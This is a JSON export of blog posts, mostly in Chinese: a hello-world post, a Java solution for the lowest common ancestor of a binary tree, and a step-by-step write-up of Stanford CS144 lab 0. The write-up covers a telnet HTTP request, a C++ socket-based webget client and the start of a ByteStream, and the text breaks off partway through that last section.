[{"content":"Welcome to AGA\u0026rsquo;s Blog. This is my first post.\nFor more information about this theme, check the documentation: https://stack.jimmycai.com/\n","date":"2023-10-18T17:55:36+08:00","image":"https://anonymity-0.github.io/posts/hello-world/cover_hu_364f5382f2aabb32.jpg","permalink":"https://anonymity-0.github.io/posts/hello-world/","title":"Hello World"},{"content":"二叉树的最近公共祖先 ‍\n🧠 问题描述： 给定一棵二叉树的根节点 root​ 和两个节点 p​ 和 q​，请找出它们的 最近公共祖先节点。\n公共祖先定义为：在树中，某个节点是 p​ 和 q​ 的祖先（包括自己），并且离它们尽可能近。\n‍\n‍\n✅ 示例代码 + 中文注释 1class Solution { 2 public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) { 3 // 递归终止条件： 4 // 如果当前节点为空，或者等于 p 或 q，则直接返回该节点 5 if (root == null || root == p || root == q) { 6 return root; 7 } 8 9 // 后序遍历：先递归查找左子树和右子树中是否包含 p 或 q 10 TreeNode left = lowestCommonAncestor(root.left, p, q); 11 TreeNode right = lowestCommonAncestor(root.right, p, q); 12 13 // 分析左右子树的查找结果 14 if (left == null \u0026amp;\u0026amp; right == null) { 15 // 左右子树都没有找到 p 或 q，说明当前子树中不包含目标节点 16 return null; 17 } else if (left == null) { 18 // 左子树没找到，右子树找到了，说明 p 和 q 都在右子树中 19 return right; 20 } else if (right == null) { 21 // 右子树没找到，左子树找到了，说明 p 和 q 都在左子树中 22 return left; 23 } else { 24 // 左右子树各找到一个，说明当前节点就是它们的最近公共祖先 25 return root; 26 } 27 } 28} 📌 举个例子帮助理解： 假设有一棵树如下：\n1 A 2 / \\ 3 B C 4 / \\ 5 D E 如果 p = D，q = E → 最近公共祖先是 B。 如果 p = D，q = C → 最近公共祖先是 A。 如果 p = B，q = A → 最近公共祖先是 A。 🧮 算法分析 时间复杂度：O(n)​\n每个节点最多访问一次，n 是节点总数。 空间复杂度：O(h)​\nh 是树的高度，主要取决于递归栈深度。 💡 总结递归逻辑： 情况 返回值 当前节点是 null 或 p/q 返回当前节点 左右都为空 当前节点不是祖先，返回 null 左空右非空 返回右边的结果 右空左非空 返回左边的结果 左右都有值 当前节点就是 LCA ","date":"2025-05-14T23:22:23+08:00","permalink":"https://anonymity-0.github.io/post/the-nearest-public-ancestor-of-binary-trees-z26lamx.html","title":"二叉树的最近公共祖先"},{"content":"前言 其实从本科开始，计网相关的课上了也有三次：第一次是大二在CQU上的，当时用的自顶向下那本书，一上来方老师就无敌催眠，不过是开卷考试，最后面向考试临时复习也拿了90+；第二次是考研的时候看的湖科大的网课，说实话这个老师动画做的很好，每个知识点好像都听懂了，但是还是没有形成成套的系统；第三次是在USTC上的高级计算机网络，上学期选这门课的时候，还是抱着一种想学东西的心态去听的，毕竟选的时候就听过这门课很硬核。遗憾的是，尝试听了一两节课后还是放弃了。机缘巧合之下，看到了cs144的lab，想给自己立一个新坑，这个学期搓出来cs144。计网的概念实在是玄乎又不好理解，或许换种方式，试试自己动手写写，顺便尝试读读英文文档（当然还是会借助一下翻译器），话不多说，cs144，启动！\n前面都是一些配置相关废话，正式写代码请看[[#3.4 Writing webget]]\n1 Set up GNU/Linux on your computer 文档中给出了几种环境的安装方式\nRecommended: Install the CS144 VirtualBox virtual-machine image (instructions at https://stanford.edu/class/cs144/vm howto/vm-howto-image.html). Use a Google Cloud virtual machine using our class’s coupon code (instructions at https://stanford.edu/class/cs144/vm howto). Run Ubuntu version 23.10, then install the required packages: sudo apt update \u0026amp;\u0026amp; sudo apt install git cmake gdb build-essential clang \\clang-tidy clang-format gcc-doc pkg-config glibc-doc tcpdump tshark Use another GNU/Linux distribution, but be aware that you may hit roadblocks along the way and will need to be comfortable debugging them. Your code will be tested on Ubuntu 23.10 LTS with g++ 13.2 and must compile and run properly under those conditions. If you have a 2020–24 MacBook (with the ARM64 M1/M2/M3 chips), VirtualBox will not successfully run. Instead, please install the UTM virtual machine software and our ARM64 virtual machine image from https://stanford.edu/class/cs144/vm howto/. 我是MAC系统所以就按第五种进行虚拟机的安装（上学期已经被折磨过一次）\n下载UTM并进行安装（这一步没啥好介绍的） 下载Setting up your CS144 VM提供的ARM64 GNU/Linux virtual machine image,并导入UTM 启动虚拟机,初始用户和密码都是cs144 到这里，虚拟机就安装完成了，开始实验！ 2 Networking by hand 这一节主要是体验一下，用图形化浏览器访问网页和在终端操作的区别。\n2.1 Fetch a Web page 在图形化浏览器访问cs144.keithw.org/hello，可以看到下图内容 在虚拟机的终端输入 telnet cs144.keithw.org http，结果如下 这个命令是用来通过Telnet协议手动模拟一个简单的HTTP请求，以连接到域名 cs144.keithw.org 上提供的HTTP服务。 telnet 是一个基于TCP/IP协议的远端登录工具，它允许用户通过网络与远程主机上的指定端口建立直接交互式连接。 cs144.keithw.org 是要连接的目标服务器的域名。 http 指定要连接的TCP端口号，默认情况下HTTP服务运行在80端口，但在这种情况下省略了端口号，因为http作为参数实际上暗示telnet应连接到HTTP服务的标准端口80。 当你执行这个命令后，telnet会尝试与该服务器的80端口建立连接。一旦连接成功，你可以在telnet会话中手工输入HTTP请求头和请求体来模拟浏览器与Web服务器之间的通信。 输入GET /hello HTTP/1.1 ，回车。这是一个HTTP头部信息，告知服务器请求的目标主机名，确保服务器知道你请求的是哪个站点的资源，即使多个站点可能共享同一IP地址和端口。 输入Host: cs144.keithw.org，回车。这是一个HTTP头部信息，告知服务器请求的目标主机名，确保服务器知道你请求的是哪个站点的资源。 输入Connection: close，回车。这也是一个HTTP头部信息，指示服务器在完成响应后关闭TCP连接，因为在HTTP/1.1中默认采用持久连接，而这里明确要求一次请求结束后就关闭连接。 在输入完上述信息后，再按一次回车键，发送一个空行。在HTTP协议中，空行标志着请求头部的结束，接下来服务器将读取并处理你的请求。 如果一切正常，你将在telnet窗口中看到服务器发回的响应。 2.2 略\n2.3 略\n3. Writing a network program using an OS stream socket 前面只是一些直观的体验，现在要真正开始编程了，在这个实验中，你将使用操作系统内置的传输控制协议支持。你需要编写一个名为“webget”的程序，创建一个TCP流套接字，连接到Web服务器，并获取一个页面。在后续的实验中，你将实现传输控制协议的另一部分，即自己实现TCP协议，将不可靠的数据报转换为可靠的字节流。\n3.1 Let’s get started—fetching and building the starter code 在虚拟机的终端窗口运行git clone https://github.com/cs144/minnow 获得源代码\nOptional: Feel free to backup your repository to a private GitHub/GitLab/Bitbucket repository (e.g., using the instructions at https://stackoverflow.com/questions/10065526/ github-how-to-make-a-fork-of-public-repository-private), but please make absolutely sure that your work remains private.（可选项，其实就是让你备份）\n进入文件夹: cd minnow\n创建一个目录来编译实验软件：cmake -S . -B build\n编译源文件: cmake --build build\n返回上层文件夹，打开 writeups/check0.md 文件，这是实验检查点报告的模板。\n. 3.2 Modern C++: mostly safe but still fast and low-level 实验作业将使用现代C++风格编写，这种风格使用最近（2011年）的语言特性以尽可能安全地进行编程。这可能与过去编写C++的方式不同。关于这种风格的参考，请参见C++ Core Guidelines。\n具体来说：\n使用 https://en.cppreference.com 作为编程资源。（我们建议您避免使用cplusplus.com，因为它可能已经过时。） 不要使用malloc()或free()。 不要使用new或delete。 尽量不使用原始指针（*），只在必要时使用“智能”指针（unique_ptr或shared_ptr）（在CS144中不需要使用这些）。 避免使用模板、线程、锁和虚函数（您在CS144中不需要使用这些）。 避免使用C风格字符串（char *str）或字符串函数（如strlen()，strcpy()）。这些容易出错。请改用std::string。 不要使用C风格强制转换（例如，(FILE *)x）。如果需要，请使用C++静态强制转换（通常在CS144中不需要这样做）。 优先通过常量引用传递函数参数（例如：const Address \u0026amp; address）。 除非需要修改，否则使每个变量都为const。 除非需要修改对象，否则使每个方法都为const。 避免使用全局变量，并尽可能使每个变量的作用域最小。 在提交作业之前，运行cmake --build build --target tidy以获取有关如何根据C++编程实践改进代码的建议，并运行cmake --build build --target format以一致地格式化代码。 3.3 阅读Minnow支持代码 为了支持这种编程风格，Minnow使用类将操作系统的函数封装成现代C++的形式。这些类主要是对您在CS 110/111课程中已经接触过的概念，如套接字和文件描述符，进行封装。 您需要阅读这些类的公共接口，这些接口定义在util/socket.hh和util/file descriptor.hh文件中的public:之后的部分。特别要注意的是，Socket是FileDescriptor的一种类型，而TCPSocket又是Socket的一种类型。\n这段话乍一看我头都大了，查阅了一下得到的解释如下：\nSocket是网络编程中的一个概念，它允许程序通过计算机网络进行通信。 FileDescriptor是一个更通用的概念，它通常指的是操作系统中的一个整数，用于标识打开的文件、套接字等资源。 在Minnow中，Socket是FileDescriptor的一个子类，这意味着Socket拥有FileDescriptor的所有功能，并且还有一些额外的网络通信相关的功能。同样，TCPSocket是Socket的子类，它提供了对TCP（传输控制协议）套接字的专门支持。 如果听起来还是很抽象，那我们还是看看代码吧\n1class Socket : public FileDescriptor 2{ 3 4public: 5 //! Bind a socket to a specified address with [bind(2)](\\ref man2::bind), usually for listen/accept 6 void bind( const Address\u0026amp; address ); 7 8 //! Bind a socket to a specified device 9 void bind_to_device( std::string_view device_name ); 10 11 //! Connect a socket to a specified peer address with [connect(2)](\\ref man2::connect) 12 void connect( const Address\u0026amp; address ); 13 14 //! Shut down a socket via [shutdown(2)](\\ref man2::shutdown) 15 void shutdown( int how ); 16 17 //! Get local address of socket with [getsockname(2)](\\ref man2::getsockname) 18 Address local_address() const; 19 //! Get peer address of socket with [getpeername(2)](\\ref man2::getpeername) 20 Address peer_address() const; 21 22 //! Allow local address to be reused sooner via [SO_REUSEADDR](\\ref man7::socket) 23 void set_reuseaddr(); 24 25 //! Check for errors (will be seen on non-blocking sockets) 26 void throw_if_error() const; 27}; 可以看到Socket类是FileDescriptor的子类，它定义了一些与套接字相关的操作，如绑定地址、连接、关闭、获取本地和对等地址等。\n1class TCPSocket : public Socket 2{ 3private: 4 //! \\brief Construct from FileDescriptor (used by accept()) 5 //! \\param[in] fd is the FileDescriptor from which to construct 6 explicit TCPSocket( FileDescriptor\u0026amp;\u0026amp; fd ) : Socket( std::move( fd ), AF_INET, SOCK_STREAM, IPPROTO_TCP ) {} 7 8public: 9 //! Default: construct an unbound, unconnected TCP socket 10 TCPSocket() : Socket( AF_INET, SOCK_STREAM ) {} 11 12 //! Mark a socket as listening for incoming connections 13 void listen( int backlog = 16 ); 14 15 //! Accept a new incoming connection 16 TCPSocket accept(); 17}; TCPSocket类是Socket的子类，它专门用于处理TCP套接字。 TCPSocket类有两个构造函数，一个是默认构造函数，用于创建一个未绑定、未连接的TCP套接字；另一个是从FileDescriptor构造的，这通常是accept方法接受新连接时使用的。 重点讲一下explicit TCPSocket( FileDescriptor\u0026amp;\u0026amp; fd ) : Socket( std::move( fd ), AF_INET, SOCK_STREAM, IPPROTO_TCP ) {}这个部分，这是之前没有遇到过的（C++学的比较浅）。 总的来说，explicit TCPSocket( FileDescriptor\u0026amp;\u0026amp; fd ) : Socket( std::move(fd), AF_INET, SOCK_STREAM, IPPROTO_TCP ) {}表示TCPSocket构造函数接受一个右值引用的FileDescriptor类型的参数fd，并使用这个参数来初始化Socket对象。\nexplicit关键字表示这个构造函数只能显式地被调用，不能隐式地转换类型。\nFileDescriptor\u0026amp;\u0026amp; fd表示这个构造函数接收一个FileDescriptor类型的参数，\u0026amp;\u0026amp;表示这个参数是右值引用，也就是说，这个参数可能是一个临时的对象。\n: Socket( std::move( fd ), AF_INET, SOCK_STREAM, IPPROTO_TCP ) 这部分是构造函数的初始化列表。它的作用是初始化这个TCPSocket对象的父类Socket。实际上是在调用基类Socket的构造函数，并传递了构造函数的参数。这样做的好处是，它可以确保基类构造函数在派生类构造函数体执行之前被调用，从而正确初始化基类的部分。\nstd::move( fd )表示将fd的所有权移动给Socket，这样可以避免不必要的复制。\nAF_INET, SOCK_STREAM, IPPROTO_TCP是创建Socket时需要的参数，它们分别表示使用的网络协议族（IPv4），套接字类型（流式套接字）和协议（TCP）。\n如果你觉得上面解释的如果还不够清晰，那说明你的c++和我一样学的半桶水，接下来是一些举例的知识补充：\nexplicit关键字 用一个更简单的例子来解释explicit关键字的作用。 想象一下你有一个装钱的钱包，这个钱包只能装纸币，不能装硬币。现在，你想要设计一个往钱包里放钱的功能。\n没有explicit的情况： 你设计了一个钱包的构造函数，这个构造函数可以接受一个纸币面额的参数，比如100，然后钱包里就会自动有100块钱。这个构造函数没有使用explicit关键字。 1class Wallet { 2public: 3 Wallet(int money) : money(money) {} 4 int getMoney() const { return money; } 5private: 6 int money; 7}; 这时，你可以这样使用这个钱包： 1Wallet wallet(100); // 明确地创建一个有100块钱的钱包 2Wallet anotherWallet = 200; // 这里隐式地将200这个整数转换成了一个钱包 在第二种情况中，你只是写了一个数字200，并没有明确地调用构造函数，但是编译器却自动帮你创建了一个钱包，并且里面有200块钱。这就是没有explicit关键字的构造函数允许的隐式转换。 使用explicit的情况： 现在，你决定在设计钱包的时候，不允许这种隐式转换，你希望每次往钱包里放钱都必须明确地调用构造函数。这时，你可以在构造函数前加上explicit关键字。 1class Wallet { 2public: 3 explicit Wallet(int money) : money(money) {} 4 int getMoney() const { return money; } 5private: 6 int money; 7}; 这时，如果你尝试之前的那种隐式转换： 1Wallet wallet(100); // 这仍然是正确的，因为这是明确地调用构造函数 2Wallet anotherWallet = 200; // 这将是一个错误，因为构造函数是explicit的，不允许隐式转换 第二行代码会导致编译错误，因为编译器不再允许你只是写一个数字就自动创建钱包。你必须明确地调用构造函数，像第一行那样。 所以，explicit关键字的作用就是防止构造函数的隐式调用，让类型转换更加明确，避免程序中出现意想不到的行为。 在cs144这段代码中，如果我们尝试这样做：\n1FileDescriptor fd(1234); // 创建一个文件描述符 2TCPSocket socket = fd; // 这将失败，因为TCPSocket的构造函数是explicit的 这段代码会失败，因为TCPSocket的构造函数是explicit的，这意味着我们不能使用隐式类型转换将FileDescriptor类型的值转换为TCPSocket对象。我们必须明确地调用构造函数，如下所示：\n1FileDescriptor fd(1234); // 创建一个文件描述符 2TCPSocket socket(std::move(fd)); // 正确，明确地调用构造函数 右值引用 在C++中，我们有两种类型的引用：左值引用和右值引用。\n左值引用是我们通常所说的引用，它引用的是一个具有明确存储位置的对象。例如：\n1int a = 5; 2 3int\u0026amp; ref = a; // 左值引用 右值引用是C++11引入的新特性，它引用的是一个临时对象，或者说是一个将要销毁的对象。这种引用通常用于移动语义和完美转发。例如：\n1int\u0026amp;\u0026amp; rref = 5; // 右值引用 在这个例子中，数字5是一个临时对象，我们可以用右值引用来引用它。\nFileDescriptor\u0026amp;\u0026amp; fd就是一个右值引用，它指向的是一个FileDescriptor类型的临时对象。这个构造函数的作用就是，直接取走这个临时对象的值，用来初始化一个新的TCPSocket对象，而不需要复制这个临时对象。\n假设有个FileDescriptor对象：\n1FileDescriptor fd1(1); 如果我们尝试这样做：\n1TCPSocket socket1(fd1); // 这会创建一个副本 这里，fd1是一个左值引用，因为它是一个有名字的对象。当我们传递fd1给TCPSocket的构造函数时，我们需要创建fd1的一个副本。\n1// 以下是创建TCPSocket对象的正确方式，使用右值引用 2TCPSocket socket1(FileDescriptor(1)); // 创建了一个临时的FileDescriptor对象 std::move() 在C++中，std::move是一个函数模板，它将一个左值引用转换为右值引用。当你在代码中看到std::move(fd)时，它的作用是将fd这个左值引用转换为右值引用。这样，你就可以传递一个临时的对象，而不需要创建它的一个副本。\n1#include \u0026lt;utility\u0026gt; // for std::move 2 3class MyObject { 4public: 5 MyObject(int value) : value(value) {} 6 MyObject(MyObject\u0026amp;\u0026amp; other) : value(other.value) { 7 other.value = 0; // \u0026#34;窃取\u0026#34; other 的资源 8 } 9 int value; 10}; 11 12int main() { 13 MyObject obj1(5); 14 MyObject obj2(std::move(obj1)); // 使用 std::move 将 obj1 转换为右值引用 15 16 // 现在，obj1 的值已经被 \u0026#34;窃取\u0026#34;，obj2 的值是 5 17 return 0; 18} 在这个例子中，我们有一个MyObject类，它有一个接受右值引用的构造函数。在main函数中，我们创建了一个MyObject对象obj1，然后我们使用std::move(obj1)将obj1转换为右值引用，然后将其传递给obj2的构造函数。这样，obj2的构造函数就可以直接接收obj1的所有权，而不需要复制obj1。\n回到原始问题，explicit TCPSocket( FileDescriptor\u0026amp;\u0026amp; fd ) : Socket( std::move(fd), AF_INET, SOCK_STREAM, IPPROTO_TCP ) {}中的std::move(fd)也是类似的作用。它将fd这个左值引用转换为右值引用，这样就可以传递一个临时的FileDescriptor对象，而不需要创建它的一个副本。这可以提高性能，因为我们避免了不必要的对象复制。\n1FileDescriptor fd1(1); 2TCPSocket socket(std::move(fd1)); 在这段代码中，std::move(fd1)将fd1转换为右值引用，然后将其传递给TCPSocket的构造函数。这样，TCPSocket的构造函数就可以直接接收fd1的所有权，而不需要复制fd1。注意，一旦你这样做了，你就不应再使用fd1了，因为它的值可能已经被\u0026quot;窃取\u0026quot;了。\n3.4 Writing webget 误会了现在才到写的时候。。。\n在构建目录中，使用文本编辑器或集成开发环境打开…/apps/webget.cc文件。 在get URL函数中，实现如文件中所述的简单Web客户端，使用之前使用的HTTP（Web）请求格式。使用TCPSocket和Address类。 提示： 请注意，在HTTP中，每行必须以“\\r\\n”结束（仅使用“\\n”或endl是不够的）。 不要忘记在你的客户端请求中包含“Connection: close”行。这告诉服务器在发送完这个请求后，不需要等待你的客户端发送更多的请求。相反，服务器将发送一个回复，然后会立即结束其发送的字节流（从服务器套接字到你的套接字）。你会发现你的传入字节流已经结束，因为当你的套接字读取完从服务器传来的整个字节流时，会达到“EOF”（文件结束）。这就是你的客户端知道服务器已经完成回复的方式。 确保读取并打印服务器所有输出直到套接字达到“EOF”（文件结束）——一次读取调用是不够的。 我们预计你将需要编写大约十行代码 我之前还尝试分析了一下源码，后来发现是我想多了。\n在写代码之前，首先来回顾一下TCP协议的Socket套接字编程。更基础的，让我们回顾一下一些基础概念：\n套接字 其实这个概念我至今都觉得很抽象，不过他确实非常重要\n首先先问个问题，请问Socket和socket有什么区别？ 你可能和我一样有些云里雾里，在不同教材或者csdn上叫法都不太统一，这玩意难道不是同一个东西？\n以下是结合我个人的理解和gpt老师的答案：\n在大多数情况下，“Socket”和“socket”指的是同一件事：计算机网络编程中用于通信的一种抽象概念，即套接字。套接字是网络通信的端点，允许不同进程在网络上进行通信。无论是大写还是小写，它们都是指同一个概念，只是书写时的大小写不同。在不同的编程语言或文档中可能会有不同的约定，但在通用的网络编程术语中，它们是等价的。\nSocket（首字母大写）： 这通常是指操作系统提供的一个抽象层，它允许网络中的不同主机间进行通信。 在编程语境中，一个Socket代表一个网络连接的端点，可以看作是不同计算机进程间或同一计算机上不同进程间通信的一个门户。 在Unix和Linux系统中，Socket是实现进程间通信（IPC）和网络通信的一种机制。 socket（首字母小写）： socket 是一组用于网络通信的 API，提供了一种统一的接口，使得应用程序可以通过网络进行通信。在不同的操作系统中，socket 的实现方式可能不同，但它们都遵循相同的规范和协议，可以实现跨平台的网络通信。 在使用C语言编写网络程序时，socket()函数是用来创建一个Socket连接的一个系统调用。 在Python等编程语言中，socket模块提供了一个用于网络通信的接口，通过这个模块可以创建Socket连接，进行数据的发送和接收。 套接字与服务端进行通信流程 其实我觉得以上都是废话，简单来说，套接字就像是一个通信的桥梁，它允许不同设备上的应用程序进行数据交换。在编程中，我们通过套接字可以实现客户端和服务器之间的通信。\n举例来说，当你使用浏览器访问一个网站时，你的电脑（作为客户端）和网站服务器之间就需要通过套接字来传输数据。这个过程大致如下：\n服务器程序首先在自己的计算机上创建一个套接字，并且告诉网络操作系统它需要监听哪个端口（Port），这个过程可以看作是服务器在告诉外界：“我现在在这个地址（端口）上等待连接。” 你的电脑（客户端）在浏览器中输入网址后，浏览器会向服务器发起一个连接请求，这个请求会通过你的电脑创建一个套接字，并且通过网络找到服务器的套接字。 服务器接收到连接请求后，会创建一个新的套接字与你的电脑的套接字进行连接，从而建立起一个数据传输的通道。 一旦连接建立，数据就可以在你的电脑和服务器之间双向传输。比如，服务器会通过这个连接发送网页的数据给你的电脑，你的电脑接收到数据后，浏览器将其渲染成你看到的网页。 在这个例子中，套接字的作用就是使得客户端和服务器能够建立一个可靠的通信通道，从而实现数据的传输。无论是Web浏览、文件传输、即时通讯等网络应用，都离不开套接字技术的支持。\n放一张陈年经典老图便于理解具体过程： c++套接字编程相关函数 cs144的lab是用c++写的，那就让我们来看看相关的类和成员函数\n1//! A wrapper around [TCP sockets](\\ref man7::tcp) 2class TCPSocket : public Socket 3{ 4private: 5 //! \\brief Construct from FileDescriptor (used by accept()) 6 //! \\param[in] fd is the FileDescriptor from which to construct 7 explicit TCPSocket( FileDescriptor\u0026amp;\u0026amp; fd ) : Socket( std::move( fd ), AF_INET, SOCK_STREAM, IPPROTO_TCP ) {} 8 9public: 10 //! Default: construct an unbound, unconnected TCP socket 11 TCPSocket() : Socket( AF_INET, SOCK_STREAM ) {} 12 13 //! Mark a socket as listening for incoming connections 14 void listen( int backlog = 16 ); 15 16 //! Accept a new incoming connection 17 TCPSocket accept(); 18}; TCPSocket() 是一个公有构造函数，用于创建一个未绑定，未连接的 TCP 套接字。\nlisten( int backlog = 16 ) 函数用于将套接字标记为监听状态，准备接收进来的连接请求。backlog 参数指定了等待连接队列的大小。\naccept() 函数用于接受一个新的连接请求。当有新的连接请求到来时，它会创建一个新的文件描述符来处理这个连接，然后使用这个文件描述符构造一个 TCPSocket 对象并返回。\n创建套接字，监听函数，接受函数都有了，其他函数呢？你可能会奇怪诶为什么TCPSocket类里没有定义？是不是在父类Socket里，在socket.hh头文件一找，嗯找到了连接函数：\n1 //! Connect a socket to a specified peer address with [connect(2)](\\ref man2::connect) 2 void connect( const Address\u0026amp; address ); void connect( const Address\u0026amp; address )：这个函数用于将套接字连接到一个指定的地址。 还是没看到读写函数和关闭函数，这时候你发现Socket也有父类FileDescriptor，继续套娃，你发现原来在file_descriptor.hh里声明了，好家伙真是连环套。 1// Read into `buffer` 2 void read( std::string\u0026amp; buffer ); 3 void read( std::vector\u0026lt;std::string\u0026gt;\u0026amp; buffers ); 4 5 // Attempt to write a buffer 6 // returns number of bytes written 7 size_t write( std::string_view buffer ); 8 size_t write( const std::vector\u0026lt;std::string_view\u0026gt;\u0026amp; buffers ); 9 size_t write( const std::vector\u0026lt;std::string\u0026gt;\u0026amp; buffers ); 10 11 // Close the underlying file descriptor 12 void close() { internal_fd_-\u0026gt;close(); } void read( std::string\u0026amp; buffer ) 和 void read( std::vector\u0026lt;std::string\u0026gt;\u0026amp; buffers )：这两个函数用于从文件描述符读取数据。第一个函数将读取的数据存入一个字符串，第二个函数将读取的数据存入一个字符串向量。 size_t write( std::string_view buffer )、size_t write( const std::vector\u0026lt;std::string_view\u0026gt;\u0026amp; buffers ) 和 size_t write( const std::vector\u0026lt;std::string\u0026gt;\u0026amp; buffers )：这三个函数用于向文件描述符写入数据。第一个函数写入一个字符串，第二个函数写入一个字符串向量，第三个函数也写入一个字符串向量。这三个函数都返回写入的字节数。 void close()：这个函数用于关闭文件描述符。 http报文格式 这部分不是代码的重点，不过还是简单介绍一下我们这次需要填写的GET请求报文，详情请参考相关专业书籍以及这个博客。\n1GET path HTTP/1.1 2Host: host 3Connection: close 注意最后还有一个空行。 用cpp实现代码如下：\n1 const string request { \u0026#34;GET \u0026#34; + path + \u0026#34; HTTP/1.1\\r\\n\u0026#34; + \u0026#34;Host: \u0026#34; + host + \u0026#34;\\r\\n\u0026#34; + \u0026#34;Connection: close\\r\\n\u0026#34; 2 + \u0026#34;\\r\\n\u0026#34; }; 实现代码 这下，你终于找齐了图上所有函数，填写好简单请求报文。可以开始编程了！结合上面的流程图和函数，你可以填补get_URL函数模拟网页访问了。实际上代码确实很短，你只需要实现TCP套接字编程的客户端部分。\n创建socket 1TCPSocket socket; 建立连接 1const string service { \u0026#34;http\u0026#34; }; 2 socket.connect( Address( host, service ) ); 发送请求 1 const string request { \u0026#34;GET \u0026#34; + path + \u0026#34; HTTP/1.1\\r\\n\u0026#34; + \u0026#34;Host: \u0026#34; + host + \u0026#34;\\r\\n\u0026#34; + \u0026#34;Connection: close\\r\\n\u0026#34; 2 + \u0026#34;\\r\\n\u0026#34; }; 3 socket.write( request ); 读取响应并输出 1 string response, buffer; 2 while ( socket.read( buffer ), !buffer.empty() ) { 3 response.append( buffer ); 4 } 5 cout \u0026lt;\u0026lt; response; 关闭连接 1 socket.close(); 好的以上就是所有代码，这次小实验主要是让我们初步上手套接字编程。接下来让我们来测试一下：\n代码测试 在终端执行以下代码进行测试\n1cmake --build build --target check_webget 如果你的代码还没完成/出现错误，那么将会出现类似以下结果：\n1Test project /home/cs144/minnow/build 2 3 Start 1: compile with bug-checkers 41/2 Test #1: compile with bug-checkers ........ 5 6Passed 7 81.02 sec 9 10 Start 2: t_webget 112/2 Test #2: t_webget .........................***Failed 12Function called: get_URL(cs144.keithw.org, /nph-hasher/xyzzy) 13Warning: get_URL() has not been implemented yet. 14ERROR: webget returned output that did not match the test\u0026#39;s expectations 如果成功，就会出现如下类似结果：\n1cs144@vm:~/minnow$ cmake --build build --target check_webget 2Test project /home/cs144/minnow/build 3 Start 1: compile with bug-checkers 41/2 Test #1: compile with bug-checkers ........ Passed 0.15 sec 5 Start 2: t_webget 62/2 Test #2: t_webget ......................... Passed 3.26 sec 7 8100% tests passed, 0 tests failed out of 2 9 10Total Test time (real) = 3.41 sec 11Built target check_webget 这时候你发现他好像有点慢，官方文档里t_webget才0.72s。诶是怎么一回事呢？ 在这里挖一个坑待填~~（因为我的c++学的真是太差了）~~\n4.An in-memory reliable byte stream 正当我以为lab0就大功告成，真是易如反掌，易如反掌啊的时候，我惊喜地发现那只是前菜，接下来的字节流编程更是折磨。\n先读题目：\n实验目的： 实现一个抽象的可靠字节流对象，即使底层网络只提供“尽力而为”（不可靠）的数据报服务。 字节流是有界的：写入端可以结束输入，之后不能再写入更多字节；读取端读到流的末尾时，会到达“EOF”（文件结束），之后不能再读取更多字节。 实验要求： 字节流需要有流量控制以限制任何给定时间的内存消耗。 字节流对象初始化时会指定一个“容量”参数，即它愿意在任何给定时刻存储在自身内存中的最大字节数。 写入端在任何给定时刻能写入的量受到限制，以确保流不会超过其存储容量。 读取端读取字节并从流中清除它们时，写入端被允许写入更多数据。 字节流用于单线程环境，不需要担心并发写入/读取、锁定或竞态条件。 实验细节： 字节流是有界的，但在写入端结束输入并完成流之前，它可以几乎任意长。 实现必须能够处理比容量长得多的流。 容量限制了在任何给定时刻保留在内存中的字节数（已写入但尚未读取），但不限制流的长度。 即使是容量仅为一个字节的对象，只要写入端一次写入一个字节，并且读取端在写入下一个字节之前读取每个字节，它仍然可以携带长达数TB的流。 需要实现的接口定义： 对于写入端：\nvoid push(std::string data)：将数据推送到流中，但只能推送可用容量允许的数据量。 void close()：信号表示流已到达结尾。不会再写入任何内容。 bool is_closed() const：流是否已被关闭？ uint64_t available_capacity() const：当前可以推送到流中的字节数。 uint64_t bytes_pushed() const：累计推送到流中的总字节数。 对于读取端：\nstd::string_view peek() const：查看缓冲区中的下一些字节。 void pop(uint64_t len)：从缓冲区中移除len个字节。 bool is_finished() const：流是否已完成（已关闭并完全弹出）？ bool has_error() const：流是否出现错误？ uint64_t bytes_buffered() const：当前缓冲的字节数（已推送且尚未弹出）。 uint64_t bytes_popped() const：从流中累计弹出的总字节数。 非常无聊的代码解读 让我们来看看byte_stream.hh头文件的源码\n1#pragma once // 确保这个头文件只被包含一次 2 3#include \u0026lt;cstdint\u0026gt; // 引入标准库，包含基本的整数类型定义 4#include \u0026lt;string\u0026gt; // 引入标准库，包含字符串类的定义 5#include \u0026lt;string_view\u0026gt; // 引入标准库，包含对字符串的非拥有（non-owning）视图的定义 6 7// ByteStream类是Writer和Reader的基类 8class ByteStream 9{ 10public: 11 // 构造函数，初始化时传入流的容量 12 explicit ByteStream(uint64_t capacity) : capacity_(capacity) {} 13 14 // 提供对Reader和Writer接口的访问的辅助函数 15 Reader\u0026amp; reader(); // 返回Reader对象的引用 16 const Reader\u0026amp; reader() const; // 返回const Reader对象的引用 17 Writer\u0026amp; writer(); // 返回Writer对象的引用 18 const Writer\u0026amp; writer() const; // 返回const Writer对象的引用 19 20 // 设置流错误状态，并提供一个方法来检查流是否发生过错误 21 void set_error() { error_ = true; } 22 bool has_error() const { return error_; } 23 24protected: 25 // 这里添加ByteStream的任何额外状态，不要添加到Writer和Reader接口中 26 uint64_t capacity_; // 流的容量 27 bool error_ {}; // 流是否发生过错误的标志 28}; 29 30// Writer类继承自ByteStream，用于写入数据 31class Writer : public ByteStream 32{ 33public: 34 // 向流中推送数据，但只能推送当前可用容量允许的数据量 35 void push(std::string data); 36 // 标记流已经结束，之后不再写入数据 37 void close(); 38 39 // 检查流是否已经被关闭 40 bool is_closed() const; 41 // 返回当前可以推送到流中的字节数 42 uint64_t available_capacity() const; 43 // 返回累计推送到流中的总字节数 44 uint64_t bytes_pushed() const; 45}; 46 47// Reader类继承自ByteStream，用于读取数据 48class Reader : public ByteStream 49{ 50public: 51 // 查看缓冲区中的下一些字节，但不移除它们 52 std::string_view peek() const; 53 // 从缓冲区移除len个字节 54 void pop(uint64_t len); 55 56 // 检查流是否已经结束（已关闭并且所有数据都已弹出） 57 bool is_finished() const; 58 // 返回当前缓冲的字节数（已推送且尚未弹出） 59 uint64_t bytes_buffered() const; 60 // 返回从流中累计弹出的总字节数 61 uint64_t bytes_popped() const; 62}; 63 64// read函数是一个辅助函数，用于从ByteStream的Reader中peek并pop最多len个字节到一个字符串中 65void read(Reader\u0026amp; reader, uint64_t len, std::string\u0026amp; out); 为了实现内存中的字节流，需要一些成员变量来维护流的状态。以下是在ByteStream类里补充的成员变量：\nstd::deque\u0026lt;char\u0026gt; buffer_;\nbuffer_是一个双端队列，用于存储字节流中的数据。使用std::deque（双端队列）是因为它支持高效的两端插入和删除操作，这对于模拟字节流的写入（push）和读取（pop）操作非常合适。 bool closed_ 